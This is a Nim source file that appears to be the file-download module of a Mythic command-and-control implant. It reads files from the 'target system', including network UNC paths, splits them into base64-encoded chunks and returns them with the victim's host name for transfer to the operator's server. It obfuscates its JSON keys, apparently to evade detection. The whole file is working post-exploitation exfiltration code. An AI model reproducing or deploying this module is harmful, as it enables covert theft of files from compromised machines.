import json, os, base64, math, strutils
import ../utils/strenc
when defined(linux):
  import posix

const CHUNK_SIZE = 512000  # 512KB chunks

type
  DownloadArgs = object
    file: string
    path: string

proc getHostname(): string =
  when defined(linux):
    var buffer: array[256, char]
    if gethostname(cast[cstring](addr buffer[0]), 256) == 0:
      return $cast[cstring](addr buffer[0])
  return ""

proc executeDownload*(taskId: string, params: JsonNode): JsonNode =
  ## Download a file from the target system to Mythic
  ## This is a background task that chunks the file
  
  try:
    let args = to(params, DownloadArgs)
    
    # Handle UNC paths and absolute paths - don't join with cwd
    let filePath = if args.path.startsWith("\\\\") or isAbsolute(args.path):
      args.path
    else:
      getCurrentDir() / args.path
    
    # Check if file exists
    if not fileExists(filePath):
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): obf("File does not exist: ") & filePath
      }
    
    # Get file info
    let fileInfo = getFileInfo(filePath)
    let fileSize = fileInfo.size
    let totalChunks = int((fileSize.float / CHUNK_SIZE.float).ceil)
    
    # Send initial download response
    let downloadResponse = %*{
      obf("total_chunks"): totalChunks,
      obf("full_path"): filePath,
      obf("host"): getHostname(),
      obf("filename"): args.file,
      obf("is_screenshot"): false,
      obf("chunk_size"): CHUNK_SIZE
    }
    
    return %*{
      obf("task_id"): taskId,
      obf("download"): downloadResponse
    }
    
  except Exception as e:
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("Error initiating download: ") & e.msg
    }

proc processDownloadChunk*(taskId: string, fileId: string, path: string, chunkNum: int): JsonNode =
  ## Process a single chunk of the download
  ## This is called for each chunk after the initial download response
  
  try:
    # Handle UNC paths and absolute paths - don't join with cwd
    let filePath = if path.startsWith("\\\\") or isAbsolute(path):
      path
    else:
      getCurrentDir() / path
    
    # Open and read the file chunk
    var file = open(filePath, fmRead)
    defer: file.close()
    
    # Seek to the correct position
    let offset = (chunkNum - 1) * CHUNK_SIZE
    file.setFilePos(offset)
    
    # Read the chunk
    var buffer = newString(CHUNK_SIZE)
    let bytesRead = file.readBuffer(addr buffer[0], CHUNK_SIZE)
    buffer.setLen(bytesRead)
    
    # Encode to base64
    let chunkData = encode(buffer)
    
    let chunkResponse = %*{
      obf("chunk_num"): chunkNum,
      obf("file_id"): fileId,
      obf("chunk_data"): chunkData,
      obf("chunk_size"): bytesRead
    }
    
    return %*{
      obf("task_id"): taskId,
      obf("download"): chunkResponse
    }
    
  except Exception as e:
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("Error reading chunk ") & $chunkNum & ": " & e.msg
    }

proc completeDownload*(taskId: string, fileId: string, path: string): JsonNode =
  ## Complete the download task
  
  let cwd = getCurrentDir()
  let filePath = cwd / path
  
  return %*{
    obf("task_id"): taskId,
    obf("completed"): true,
    obf("status"): obf("success"),
    obf("user_output"): fileId,
    obf("artifacts"): [
      {
        obf("base_artifact"): obf("FileOpen"),
        obf("artifact"): filePath
      }
    ]
  }
